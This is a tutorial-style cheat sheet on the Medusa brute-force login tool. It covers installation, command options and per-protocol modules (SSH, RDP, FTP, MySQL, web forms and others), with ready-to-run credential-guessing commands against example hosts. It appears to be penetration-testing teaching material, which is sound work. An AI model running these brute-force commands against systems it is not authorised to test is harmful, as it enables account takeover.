```shell-session
sudo apt-get -y update
```
```shell-session
sudo apt-get -y install medusa
```
```shell-session
medusa -h
```

```shell-session

medusa [target_options] [credential_options] -M module [module_options]
```

|Parameter|Explanation|Usage Example|
|---|---|---|
|`-h HOST` or `-H FILE`|Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).|`medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`|
|`-u USERNAME` or `-U FILE`|Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).|`medusa -u admin ...` or `medusa -U usernames.txt ...`|
|`-p PASSWORD` or `-P FILE`|Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).|`medusa -p password123 ...` or `medusa -P passwords.txt ...`|
|`-M MODULE`|Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).|`medusa -M ssh ...`|
|`-m "MODULE_OPTION"`|Module options: Provide additional parameters required by the chosen module, enclosed in quotes.|`medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...`|
|`-t TASKS`|Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.|`medusa -t 4 ...`|
|`-f` or `-F`|Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).|`medusa -f ...` or `medusa -F ...`|
|`-n PORT`|Port: Specify a non-default port for the target service.|`medusa -n 2222 ...`|
|`-v LEVEL`|Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output.|`medusa -v 4 ...`|

|Medusa Module|Service/Protocol|Description|Usage Example|
|---|---|---|---|
|FTP|File Transfer Protocol|Brute-forcing FTP login credentials, used for file transfers over a network.|`medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`|
|HTTP|Hypertext Transfer Protocol|Brute-forcing login forms on web applications over HTTP (GET/POST).|`medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^`|
|IMAP|Internet Message Access Protocol|Brute-forcing IMAP logins, often used to access email servers.|`medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`|
|MySQL|MySQL Database|Brute-forcing MySQL database credentials, commonly used for web applications and databases.|`medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`|
|POP3|Post Office Protocol 3|Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.|`medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`|
|RDP|Remote Desktop Protocol|Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.|`medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`|
|SSHv2|Secure Shell (SSH)|Brute-forcing SSH logins, commonly used for secure remote access.|`medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`|
|Subversion (SVN)|Version Control System|Brute-forcing Subversion (SVN) repositories for version control.|`medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`|
|Telnet|Telnet Protocol|Brute-forcing Telnet services for remote command execution on older systems.|`medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`|
|VNC|Virtual Network Computing|Brute-forcing VNC login credentials for remote desktop access.|`medusa -M vnc -h 192.168.1.100 -P passwords.txt`|
|Web Form|Brute-forcing Web Login Forms|Brute-forcing login forms on websites using HTTP POST requests.|`medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`|

### Targeting an SSH Server

```shell-session
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

### Targeting Multiple Web Servers with Basic HTTP Authentication

```shell-session

medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

### Testing for Empty or Default Passwords

```shell-session

medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

- Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
